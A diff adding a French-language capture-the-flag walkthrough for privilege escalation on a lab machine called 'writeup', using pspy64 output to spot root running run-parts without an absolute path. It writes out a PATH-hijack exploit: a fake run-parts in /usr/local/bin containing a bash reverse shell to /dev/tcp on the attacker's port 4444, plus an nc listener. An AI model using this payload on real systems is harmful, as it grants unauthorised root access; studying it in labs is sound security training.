@@ -523,14 +523,154 @@ jkr@writeup:~$
 
 {{< recette "privilege-escalation-linux" >}}
 
-### Vers utilisateur intermédiaire (si applicable)
-- Méthode (sudoers, capabilities, SUID, timers, service vulnérable).
-- Indices collectés (configs, clés, cron, journaux).
+### Post-exploitation – Énumération locale
 
-### Vers root
-- Vecteur principal, exploitation, contournements.
-- Preuves : `id`, `hostnamectl`, `cat /root/root.txt`.
-- Remédiations possibles (leçons sécurité).
+  Une fois connecté en SSH en tant que `jkr`, tu appliques la méthodologie décrite dans la recette
+   {{< recette "privilege-escalation-linux" >}}.
+
+  La première étape consiste toujours à vérifier les droits `sudo` :
+
+  ```
+  jkr@writeup:~$ sudo -l
+  -bash: sudo: command not found
+  ```
+
+  L’absence de `sudo` élimine immédiatement cette piste et oriente l’analyse vers les tâches automatiques exécutées par root.
+
+------
+
+### Observation des tâches root
+
+La méthode recommande ensuite d’observer l’activité du système en temps réel à l’aide de `pspy64`, afin d’identifier des commandes exécutées automatiquement avec des privilèges élevés.
+
+> **Note :** après avoir copié `pspy64` sur la cible via la recette {{< recette "copier-fichiers-kali" >}}, l’exécution depuis `/dev/shm` n’est pas autorisée sur cette machine. Copier le binaire dans `/tmp` permet de l’exécuter sans problème.
+>
+> N'oublie pas de rendre pspy64 exécutable avec:
+>
+> ```bash
+> jkr@writeup:/tmp$ chmod +x pspy64
+> ```
+>
+> 
+
+```bash
+2026/01/16 11:53:01 CMD: UID=0     PID=2769   | /usr/sbin/CRON 
+2026/01/16 11:53:01 CMD: UID=0     PID=2770   | /usr/sbin/CRON 
+2026/01/16 11:53:01 CMD: UID=0     PID=2771   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
+2026/01/16 11:54:01 CMD: UID=0     PID=2772   | /usr/sbin/CRON 
+2026/01/16 11:54:01 CMD: UID=0     PID=2773   | /usr/sbin/CRON 
+2026/01/16 11:54:01 CMD: UID=0     PID=2774   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
+2026/01/16 11:55:01 CMD: UID=0     PID=2775   | /usr/sbin/CRON 
+2026/01/16 11:55:01 CMD: UID=0     PID=2776   | /usr/sbin/CRON 
+2026/01/16 11:55:01 CMD: UID=0     PID=2777   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
+
+```
+
+Lors de l’analyse, tu remarques l’exécution régulière d’un script lancé par **CRON** en tant que root :
+
+  ```
+  /root/bin/cleanup.pl
+  ```
+
+Cependant, ce fichier n’est ni lisible ni modifiable par `jkr`, et aucun répertoire accessible n’est utilisé. La piste est donc abandonnée.
+
+------
+
+### Déclenchement et découverte clé
+
+Pendant que `pspy64` est en cours d’exécution, tu ouvres une **nouvelle session SSH dans un autre terminal**, ce qui est une pratique courante pour déclencher les actions automatiques liées à la connexion.
+
+```bash
+2026/01/16 11:53:01 CMD: UID=0     PID=2769   | /usr/sbin/CRON 
+2026/01/16 11:53:01 CMD: UID=0     PID=2770   | /usr/sbin/CRON 
+2026/01/16 11:53:01 CMD: UID=0     PID=2771   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
+2026/01/16 11:54:01 CMD: UID=0     PID=2772   | /usr/sbin/CRON 
+2026/01/16 11:54:01 CMD: UID=0     PID=2773   | /usr/sbin/CRON 
+2026/01/16 11:54:01 CMD: UID=0     PID=2774   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
+2026/01/16 11:55:01 CMD: UID=0     PID=2775   | /usr/sbin/CRON 
+2026/01/16 11:55:01 CMD: UID=0     PID=2776   | /usr/sbin/CRON 
+2026/01/16 11:55:01 CMD: UID=0     PID=2777   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
+2026/01/16 11:55:03 CMD: UID=0     PID=2778   | sshd: [accepted] 
+2026/01/16 11:55:03 CMD: UID=0     PID=2779   | sshd: [accepted]  
+2026/01/16 11:55:08 CMD: UID=0     PID=2780   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
+2026/01/16 11:55:08 CMD: UID=0     PID=2781   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
+2026/01/16 11:55:08 CMD: UID=0     PID=2782   | run-parts --lsbsysinit /etc/update-motd.d 
+2026/01/16 11:55:08 CMD: UID=0     PID=2783   | uname -rnsom 
+2026/01/16 11:55:08 CMD: UID=0     PID=2784   | sshd: jkr [priv]  
+2026/01/16 11:55:09 CMD: UID=1000  PID=2785   | -bash 
+2026/01/16 11:55:09 CMD: UID=1000  PID=2787   | -bash 
+2026/01/16 11:55:09 CMD: UID=1000  PID=2786   | -bash 
+2026/01/16 11:55:09 CMD: UID=1000  PID=2788   | -bash 
+2026/01/16 11:55:09 CMD: UID=1000  PID=2789   | -bash
+```
+
+À ce moment-là, tu observes une autre commande exécutée par **root** :
+
+  ```
+  run-parts --lsbsysinit /etc/update-motd.d
+  ```
+
+Ici, `run-parts` est appelé **sans chemin absolu**, alors que le `PATH` inclut des répertoires accessibles en écriture par `jkr` (`/usr/local/bin`).
+
+Cette situation met en évidence une technique d’escalade de privilèges bien connue : le détournement du `PATH`. Lorsqu’une commande est lancée par root sans chemin absolu, le système cherche l’exécutable dans les répertoires listés dans le `PATH`. Si l’un de ces répertoires est accessible en écriture, **un utilisateur peut y placer son propre binaire, qui sera alors exécuté à la place de celui attendu.**
+
+**C’est une voie royale pour déclencher l’exécution d’un reverse shell avec les privilèges root.**
+
+### Lancement d'un Reverse Shell
+
+Pour exploiter le détournement de `PATH`, tu vas créer un **faux binaire `run-parts`** dans un répertoire présent dans le `PATH` et accessible en écriture par `jkr`, par exemple `/usr/local/bin`.
+
+1. Préparer le listener sur Kali
+
+Sur ta machine Kali, commence par ouvrir un listener :
+
+```
+nc -lvnp 4444
+```
+
+------
+
+2. Créer le binaire piégé sur la cible
+
+Sur la machine cible, crée un fichier nommé `run-parts` dans `/usr/local/bin` :
+
+```
+nano /usr/local/bin/run-parts
+```
+
+Ajoute le contenu suivant (en adaptant l’IP à celle de ta machine Kali) :
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
+```
+
+------
+
+3. Rendre le binaire exécutable
+
+```
+chmod +x /usr/local/bin/run-parts
+```
+
+------
+
+4. Déclenchement automatique
+
+Aucune action supplémentaire n’est nécessaire.
+ Lors de la prochaine connexion SSH, root appellera `run-parts` sans chemin absolu.
+ Le système exécutera alors **ton binaire**, ce qui déclenchera immédiatement le reverse shell.
+
+------
+
+5. Vérification côté Kali
+
+Dans le terminal Kali, tu obtiens un shell root.
+ Tu peux le confirmer avec :
+
+```
+whoami
+```
 
 ---
 
